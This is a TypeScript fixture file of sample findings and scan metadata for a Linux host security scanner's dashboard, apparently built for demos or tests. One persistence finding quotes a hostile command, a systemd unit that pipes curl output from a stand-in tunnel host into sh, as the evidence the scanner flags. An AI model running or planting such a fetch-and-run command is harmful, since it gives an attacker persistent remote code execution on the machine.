// Hand-picked from the real rule pack (rules/**/*.yaml) with their `{{ }}` templates
// rendered against plausible sample values — the rule text itself is 100% real and
// unmodified; only the interpolated facts (a port number, a config value) are illustrative.
// See ../README.md for why this exists.

export interface Finding {
  id: string;
  rule_id: string;
  severity: "critical" | "high" | "medium" | "low" | "info";
  title: string;
  explanation: string;
  fix_hint: string;
}

const now = new Date();
const minutesAgo = (m: number) => new Date(now.getTime() - m * 60_000).toISOString();

export const findings: Finding[] = [
  {
    id: "f-ssh-001",
    rule_id: "BLWK-SSH-001",
    severity: "critical",
    title: "SSH password authentication is enabled",
    explanation:
      'PasswordAuthentication is set to "yes" in sshd_config, which allows an attacker to ' +
      "brute-force their way in with a password guess instead of needing a private key.",
    fix_hint: "Set 'PasswordAuthentication no' in /etc/ssh/sshd_config and run 'systemctl restart sshd'.",
  },
  {
    id: "f-persist-001",
    rule_id: "BLWK-PERSIST-001",
    severity: "critical",
    title: "systemd unit runs a tunneling tool",
    explanation:
      'The systemd unit "sync-helper.service" runs a command referencing a tunneling tool ' +
      '("/usr/bin/curl -fsSL https://tunnel.example.net/connect | sh"). This is a common ' +
      "attacker persistence pattern — a reverse tunnel that reaches back out through a " +
      "service like this survives reboots and bypasses inbound firewall rules entirely.",
    fix_hint:
      "If you didn't set this up yourself: 'systemctl disable --now <unit>' and remove the unit " +
      "file from /etc/systemd/system/, then rotate any credentials the box had access to.",
  },
  {
    id: "f-net-001",
    rule_id: "BLWK-NET-001",
    severity: "high",
    title: "A VNC/remote-desktop port is listening",
    explanation:
      "Port 5900 is listening — this is a standard VNC (5900-range) or noVNC/websockify (6080) " +
      "port. If this wasn't deliberately set up with a password and restricted access, it's a " +
      "full remote-desktop backdoor.",
    fix_hint:
      "If this isn't an intentional remote-desktop setup: stop the service (check 'ps aux' for " +
      "x11vnc/vncserver/websockify) and remove any systemd unit or cron entry that restarts it.",
  },
  {
    id: "f-kernel-006",
    rule_id: "BLWK-KERNEL-006",
    severity: "high",
    title: "Unprivileged users can load BPF programs into the kernel",
    explanation:
      "kernel.unprivileged_bpf_disabled is 0 — any local user can load BPF programs into the " +
      "kernel without CAP_SYS_ADMIN. The BPF verifier has been the source of numerous local " +
      "privilege-escalation CVEs; this setting is what determines whether that class of bug is " +
      "reachable by an unprivileged attacker at all.",
    fix_hint: "Set 'kernel.unprivileged_bpf_disabled=1' via /etc/sysctl.d/ and run 'sysctl --system'.",
  },
  {
    id: "f-acct-002",
    rule_id: "BLWK-ACCT-002",
    severity: "low",
    title: "Password maximum age is excessively long",
    explanation:
      "PASS_MAX_DAYS in /etc/login.defs is 99999 — passwords never expire in any practical " +
      "sense, so a leaked credential stays valid indefinitely.",
    fix_hint: "Set 'PASS_MAX_DAYS 90' (or your organization's policy) in /etc/login.defs.",
  },
  {
    id: "f-log-002",
    rule_id: "BLWK-LOG-002",
    severity: "low",
    title: "System logs are not forwarded off-box",
    explanation:
      "rsyslog has no remote forwarding rule configured — logs only exist locally. Anyone with " +
      "root on this machine can edit or delete them, so local-only logging can't be trusted as " +
      "evidence of what a root-level attacker did.",
    fix_hint:
      "Add a forwarding rule to /etc/rsyslog.conf (e.g. '*.* @@logs.example.com:514') pointing " +
      "at a log destination this machine doesn't control.",
  },
];

export const dashboardSnapshot = {
  findings,
  meta: {
    host_fingerprint: "linux-desktop / Linux 6.8.0-49-generic",
    started_at: minutesAgo(6),
    privileged_collectors_skipped: ["sudoers", "shadow_file_integrity"],
  },
};

export const scanRunResult = {
  findings,
  host_fingerprint: dashboardSnapshot.meta.host_fingerprint,
  privileged_collectors_skipped: [],
  collector_errors: [],
};

export const historyRuns = [
  {
    id: "run-1",
    started_at: minutesAgo(6),
    finished_at: minutesAgo(6),
    host_fingerprint: dashboardSnapshot.meta.host_fingerprint,
    rules_loaded: 56,
    rules_failed: 0,
    collectors_failed: 0,
    privileged_collectors_skipped: ["sudoers", "shadow_file_integrity"],
    total_findings: findings.length,
  },
  {
    id: "run-2",
    started_at: minutesAgo(6 + 15),
    finished_at: minutesAgo(6 + 15),
    host_fingerprint: dashboardSnapshot.meta.host_fingerprint,
    rules_loaded: 56,
    rules_failed: 0,
    collectors_failed: 0,
    privileged_collectors_skipped: ["sudoers", "shadow_file_integrity"],
    total_findings: findings.length + 1,
  },
  {
    id: "run-3",
    started_at: minutesAgo(6 + 30),
    finished_at: minutesAgo(6 + 30),
    host_fingerprint: dashboardSnapshot.meta.host_fingerprint,
    rules_loaded: 56,
    rules_failed: 0,
    collectors_failed: 0,
    privileged_collectors_skipped: [],
    total_findings: findings.length + 2,
  },
];

export const clamavInfo = {
  version: {
    engine_version: "1.5.3",
    database_version: "28055",
    database_date: "Thu Jul  9 13:25:20 2026",
  },
  install_command: null,
};

export const monitoringStatusInitial = {
  enabled: true,
  interval_minutes: 15,
  last_tick_at: minutesAgo(6),
  next_tick_at: new Date(now.getTime() + 9 * 60_000).toISOString(),
  ticks_completed: 42,
  last_tick_new_findings: 0,
};

// A handful of plausible file paths for the AV scan's live-progress stream — the sweep
// order Bulwark actually uses (Downloads, then the world-writable temp dirs).
export const avScanPaths = [
  "/home/user/Downloads/invoice_Q3.pdf",
  "/home/user/Downloads/setup-tool.AppImage",
  "/home/user/Downloads/report-final.docx",
  "/tmp/build-cache/artifact.tar.gz",
  "/tmp/pip-req-build-4x2z/wheel.whl",
  "/tmp/systemd-private-abc123/tmp/session.lock",
  "/var/tmp/apt-dpkg-install-9f2k1/control.tar.zst",
  "/home/user/Downloads/eicar_test_file.com",
  "/home/user/Downloads/screenshot_2026-07-10.png",
  "/tmp/vscode-typescript1000/tsserver.log",
];
